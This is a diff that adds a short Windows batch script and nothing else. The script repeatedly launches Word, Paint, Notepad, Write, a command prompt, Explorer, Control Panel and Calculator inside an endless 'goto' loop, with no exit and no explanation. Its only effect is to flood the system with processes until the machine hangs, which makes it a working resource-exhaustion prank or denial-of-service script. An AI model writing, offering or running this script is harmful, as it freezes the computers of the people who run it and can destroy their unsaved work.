@@ -1,0 +1,18 @@
+
+
+
+
+
+
+
+@echo off
+:x 
+Start winword
+Start mspaint
+Start notepad
+Start write
+Start cmd
+Start explorer
+Start control
+Start calc
+goto x
